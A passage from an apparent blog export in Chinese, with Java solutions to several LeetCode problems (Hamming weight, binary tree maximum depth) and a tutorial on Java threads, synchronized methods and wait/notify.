<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isOneBitCharacter</span><span class="params">(<span class="keyword">int</span>[] bits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; bits.length - <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (bits[index] == <span class="number">0</span>) &#123;</span><br><span class="line">        		index++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		index += <span class="number">2</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> index == bits.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>191. 位1的个数</title>
    <url>/2018/08/30/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-15-%E4%BA%8C%E7%BA%A7%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，输入是一个无符号整数，返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为汉明重量）</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 11</span><br><span class="line">输出: 3</span><br><span class="line">解释: 整数 11 的二进制表示为 00000000000000000000000000001011</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 128</span><br><span class="line">输出: 1</span><br><span class="line">解释: 整数 128 的二进制表示为 00000000000000000000000010000000</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：使用库函数"><a href="#解法一：使用库函数" class="headerlink" title="解法一：使用库函数"></a>解法一：使用库函数</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// you need to treat n as an unsigned value</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.bitCount(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二：使用布赖恩·克尼根位计数算法"><a href="#解法二：使用布赖恩·克尼根位计数算法" class="headerlink" title="解法二：使用布赖恩·克尼根位计数算法"></a>解法二：使用<a href="https://www.techiedelight.com/brian-kernighans-algorithm-count-set-bits-integer/" target="_blank" rel="noopener">布赖恩·克尼根位计数算法</a></h4><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> != n) &#123;</span><br><span class="line">        	n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">        	count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：移位-超时"><a href="#解法三：移位-超时" class="headerlink" title="解法三：移位(超时)"></a>解法三：移位(超时)</h3><h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">int</span> distance = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">	      <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">	        distance += <span class="number">1</span>;</span><br><span class="line">	      n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> distance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java线程</title>
    <url>/2018/08/30/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/0.Java%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Java线程"><a href="#Java线程" class="headerlink" title="Java线程"></a>Java线程</h1><h2 id="什么是线程"><a href="#什么是线程" class="headerlink" title="什么是线程"></a>什么是线程</h2><p>线程，有时候被称为轻量进程，是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针，寄存器集合和堆栈组合。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行。由于线程之间的相互制约，只是线程在运行中呈现间断性。</p>
<h3 id="单线程程序"><a href="#单线程程序" class="headerlink" title="单线程程序"></a>单线程程序</h3><p>先来看一个单线程程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Hello, Thread"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/1.%E5%8D%95%E7%BA%BF%E7%A8%8B.PNG" alt="单线程运行"></p>
<p>Java程序在执行时，至少会有一个线程在运行。上述代码中运行的就是被称作<strong>主线程</strong>的线程。主线程会执行Main类的main方法。在main方法中所有的处理都执行完毕之后，主线程也就终止了。</p>
<h2 id="实现多线程"><a href="#实现多线程" class="headerlink" title="实现多线程"></a>实现多线程</h2><p>在Java中，有两种方法是可以实现多线程的。一种是继承Thread类，另外一种是实现Runnable接口。</p>
<h3 id="继承Trhead"><a href="#继承Trhead" class="headerlink" title="继承Trhead"></a>继承Trhead</h3><p>先来看一段代码。<br>MyThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;    <span class="comment">// 继承Thread接口</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;    <span class="comment">// 线程的所有操作都写在run方法中</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Hello"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		MyThread thread = <span class="keyword">new</span> MyThread();</span><br><span class="line">		thread.start();    <span class="comment">//    启动一个线程，线程这个时候状态变为runnable，不一定分到cpu</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"Thread!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行Main类中的main 方法后，就“可能”得到如下输出：</p>
<p><img src="https://huhansi.github.io/images/2.%E5%A4%9A%E7%BA%BF%E7%A8%8B.PNG" alt="多线程运行"><br>之所以说是可能，是因为线程被调度的时间点是不确定的，它可能在主线程执行完毕之后才调度，也可能在主线程执行了一半才调度。<br>线程的操作都写在run方法中，当run方法执行结束时，线程也会跟着终止。然而，要启动一个线程，还必须调用它的start方法。</p>
<h3 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h3><p>还是先看一段代码<br>Mythread1类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread1</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;    <span class="comment">// 实现Runnable</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;    <span class="comment">// 重写run方法</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"Hello "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1());    <span class="comment">// 以Runnable为参数，生成一个线程</span></span><br><span class="line">		thread.start();    <span class="comment">// 启动线程</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"Thread!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<p><img src="https://huhansi.github.io/images/3.%E5%AE%9E%E7%8E%B0Runnable%E6%8E%A5%E5%8F%A3.PNG" alt="实现Runnable接口"></p>
<h2 id="线程的启动"><a href="#线程的启动" class="headerlink" title="线程的启动"></a>线程的启动</h2><p>其实线程的启动已经在上一章节说的差不多了，主要有两种方式：<br>1、 利用Thread类的子类的实例启动线程；<br>2、 利用Runnable接口的实现类的实例启动线程。</p>
<h2 id="线程的暂停"><a href="#线程的暂停" class="headerlink" title="线程的暂停"></a>线程的暂停</h2><p>线程Thread类中的静态方法sleep能够暂停线程运行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"Thread! "</span> + System.currentTimeMillis());    <span class="comment">// 打印Thread！ 和 系统当前时间</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行上面的代码后，就会发现程序会以一秒的间隔输出一句Thread</p>
<p><img src="https://huhansi.github.io/images/4.sleep.PNG" alt="线程的休眠"><br>在sleep方法中，停止时间也可以制定到纳秒单位。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.sleep(毫秒，纳秒)</span><br></pre></td></tr></table></figure>
<h2 id="线程的互斥"><a href="#线程的互斥" class="headerlink" title="线程的互斥"></a>线程的互斥</h2><p>多线程程序中的各个线程都是自由运行的，所有它们有时候就会同时操作同一个实例。这在某些情况下会引发问题。例如，从银行账户取款时，余额确认部分的代码应该是像下面这样的：<br>if (可用余额大于等于取款金额) {<br>    从可用余额上减去取款金额<br>}<br>首先确认可用余额，确认是否允许存款。如果允许，则从可用余额上减去取款金额，这样才不会导致可用余额变为负数。<br>但是，如果两个线程同时执行这段代码，那么可用余额就有可能变为负数。<br>假设可用余额为100块，需要取款80块，那么在下面这种情况下，余额就可能变为负数：<br>线程A                                            线程B<br>可用余额是否大于取款金额<br>    是的</p>
<pre><code>《在此时切换至线程B》
                    可用余额是否大于取款金额
                        是的
                    从可用余额上减去取款金额
                        可用余额变为20块
《在此时切换回线程A》</code></pre><p>从可用余额上减去取款金额<br>    可用余额变为-60块</p>
<p>这种线程A和线程B之间互相竞争而引起的与预期相反的情况称为数据竞争或者竞态条件。<br>这个时候就需要有一种“交通管制”来协助防止发生数据金正。例如，一个线程正在执行某一部分操作，那么其他线程就不可以再执行这部分操作。这种类似于交通管制的操作通常称之为互斥。<br>Java用synchronized关键字来执行线程的互斥处理。</p>
<h3 id="synchronized方法"><a href="#synchronized方法" class="headerlink" title="synchronized方法"></a>synchronized方法</h3><p>如果声明一个方法时，在前面加上关键字synchd，那么这个方法就只能由一个线程运行。只能由一个线程运行是每次只能由一个线程运行的意思，并不是说仅能让某以特定线程运行。这种方法称之为synchronized方法，有时也称之为同步方法。<br>那么存取款这个过程就可以改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bank</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> money;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Bank</span><span class="params">(String name, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.money = money;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;    <span class="comment">// 对方法加锁</span></span><br><span class="line">		money += m;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (money &gt;= m) &#123;</span><br><span class="line">			money -= m;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对每个Bank实例来说，它们都拥有一个独立的说，因此，实例1和实例2之间是互相不影响的。但是在实例内部，如果正在执行加锁的方法，deposit，那么就不能执行withdraw方法，因为此时锁正被方法deposit持有，withdraw方法只能阻塞直至获取锁为止。但是，没有加上synchronized关键字的getName方法，是可以随便调用的，调用它不需要任何条件。</p>
<h3 id="synchronized代码块"><a href="#synchronized代码块" class="headerlink" title="synchronized代码块"></a>synchronized代码块</h3><p>如果只是想让方法中的某一部分由一个线程运行，而非整个方法，则可以使用synchronized代码块，格式如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (表达式) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其中"表达式"为获取锁的示例</span></span><br></pre></td></tr></table></figure>
<p>synchronized代码块用于精确控制互斥处理的执行范围。</p>
<h3 id="synchronized实例方法和synchronized代码块"><a href="#synchronized实例方法和synchronized代码块" class="headerlink" title="synchronized实例方法和synchronized代码块"></a>synchronized实例方法和synchronized代码块</h3><p>假设有如下synchronized示例方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这根下面将方法体用synchronized代码块包围起来是等效的，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，synchronized示例方法是使用this的锁来执行线程的互斥处理的。</p>
<h3 id="synchronized静态方法和synchronized代码块"><a href="#synchronized静态方法和synchronized代码块" class="headerlink" title="synchronized静态方法和synchronized代码块"></a>synchronized静态方法和synchronized代码块</h3><p>假设有如下synchronized静态方法。synchronized静态方法每次只能由一个线程运行，这一点和synchronized实例方法相同。但synchronized静态方法使用的锁和synchronized实例方法使用的锁是不一样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Something</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这跟下面将方法体用synchronized代码块包围起来是等效的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Something</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span>(Something<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，synchronized静态方式是使用该类的类对象的锁来执行线程的互斥处理的。Something.class是Something类对应的java.lang.class类的实例。</p>
<h2 id="线程的协作"><a href="#线程的协作" class="headerlink" title="线程的协作"></a>线程的协作</h2><h3 id="等待队列"><a href="#等待队列" class="headerlink" title="等待队列"></a>等待队列</h3><p>所有的实例都拥有一个等待队列，他是在实例的wait方法执行后停止操作的线程的队列。<br>当执行wait方法后，线程便会暂停操作，进入等待队列。除非发现下列某一种情况，否则线程会一直在等待队列中休眠。当下列任意一种情况发生时，线程便会退出等待队列。</p>
<ul>
<li>有其他线程的notify方法来唤醒线程</li>
<li>有其他线程的notifyAll方法来唤醒线程</li>
<li>有其他线程的interrupt方法来唤醒线程</li>
<li>wait方法超时</li>
</ul>
<p><strong>注意：</strong>等待队列是一个虚拟的概念。它既不是实例中的字段，也不是用于获取正在实力上等待的线程的列表的方法。</p>
<h3 id="wait方法"><a href="#wait方法" class="headerlink" title="wait方法"></a>wait方法</h3><p>wait方法会让线程进入等待队列。假设执行了下面这条语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.wait()</span><br></pre></td></tr></table></figure>
<p>  那么当前线程便会暂停运行，并进入obj实例的等待队列中，这叫做“线程正在obj上wait”。<br>  如果实例方法中有如下语句，有下面代码（1）处语句，由于其含义等同于（2）处语句，所以执行了wait()的线程将会进入this的等待，队列中，这可以说“线程正在this上wait”。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">wait();    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">this</span>.wait()    <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>若要执行wait方法，线程必须持有锁。但如果线程进入等待队列，便会释放其占有的实例的锁。</p>
<h3 id="notify方法"><a href="#notify方法" class="headerlink" title="notify方法"></a>notify方法</h3><p>notify（通知）方法会将等待队列中的一个线程取出。假设我们执行里下面的这条语句。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.notify()</span><br></pre></td></tr></table></figure>
<p>那么obj的等待队列中的一个线程便会选中和唤醒，然后就会退出等待队列。</p>
<p>notify唤醒的线程并不会在执行notify的一瞬间重新运行。因为在执行notify的那一瞬间，执行notify的线程还持有着锁，所以其他线程还无法获取这个实例的锁。 </p>
<p>加入在执行notify方法时，正在等待队列中等待的线程不止一个，对于“这时该如何来选择线程”这个问题规范中并没有做出规定。就近视选择最先wait的线程还是随机选择，或者采用其他方法要取决于Java平台运行环境。因此编写程序是需要注意，最好不要编写依赖于所选线程的程序。  </p>
<h3 id="notifyAll方法"><a href="#notifyAll方法" class="headerlink" title="notifyAll方法"></a>notifyAll方法</h3><p>notifyAll方法会将等待队列中的所有线程都取出来。例如，执行下面这条语句之后，在obj实例的等待队列中休眠的所有线程都会被唤醒。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.notifyAll()</span><br></pre></td></tr></table></figure>
<p>如果简单地在示例方法中写成下面代码（1）处这样，那么由于其含义等同于（2），所以该语句所在方面的实例（this）的等待队列中所有线程都会退出等待队列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">notifyAll()    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">this</span>.notifyAll()    <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>如果未持有锁的线程调用wait、notify或者notifyAll，异常java.lang.IllegalMonitorStateException会被抛出。</li>
<li>由于notify唤醒的线程较少，所以处理速度要比使用notifyAll时快</li>
<li>但使用notify时，如果处理不好，程序便可能会停止。一般来说，使用notifyAll的代码比使用notify时更为健壮。</li>
<li>除非开发人员完全理解代码的含义和范围，否则使用notifyAll更为稳妥。<br>notify方法仅欢迎一个线程，而notifyAll则唤醒所有线程，这是两者之间的唯一区别。<h2 id="线程的状态转移"><a href="#线程的状态转移" class="headerlink" title="线程的状态转移"></a>线程的状态转移</h2>具体见下图，括号中的单词是Thread.State中定义的Enum名。</li>
</ul>
<p><img src="https://huhansi.github.io/images/5.%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB.png" alt="线程的状态转移"></p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>百度百科-线程：<a href="https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B" target="_blank" rel="noopener">https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B</a><br>《图解Java多线程设计模式》</p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>104. 二叉树的最大深度</title>
    <url>/2018/08/29/LeetCode/leetcode-000104.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p>说明: 叶子节点是指没有子节点的节点。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p>给定二叉树 <code>[3,9,20,null,null,15,7]</code>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>返回它的最大深度 3 。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归求解"><a href="#解法一：递归求解" class="headerlink" title="解法一：递归求解"></a>解法一：递归求解</h3><p>分别求出左右子树的最大深度，最后加一就行。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> dl = maxDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> dr = maxDepth(root.right) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> dl &gt; dr ? dl : dr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助栈"><a href="#解法二：借助栈" class="headerlink" title="解法二：借助栈"></a>解法二：借助栈</h3><p>我们还可以在栈的帮助下将上面的递归转换为迭代。</p>
<p>使用 DFS 策略访问每个结点，同时在每次访问时更新最大深度。</p>
<p>所以我们从包含根结点且相应深度为 1 的栈开始。然后我们继续迭代：将当前结点弹出栈并推入子结点。每一步都会更新深度.</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Queue&lt;Pair&lt;TreeNode, Integer&gt;&gt; stack = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">      stack.add(<span class="keyword">new</span> Pair(root, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">      Pair&lt;TreeNode, Integer&gt; current = stack.poll();</span><br><span class="line">      root = current.getKey();</span><br><span class="line">      <span class="keyword">int</span> current_depth = current.getValue();</span><br><span class="line">      <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">        depth = Math.max(depth, current_depth);</span><br><span class="line">        stack.add(<span class="keyword">new</span> Pair(root.left, current_depth + <span class="number">1</span>));</span><br><span class="line">        stack.add(<span class="keyword">new</span> Pair(root.right, current_depth + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> depth;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>141.环形链表</title>
    <url>/2018/08/29/LeetCode/leetcode-000141.%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个链表，判断链表中是否有环。</p>
<p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p>
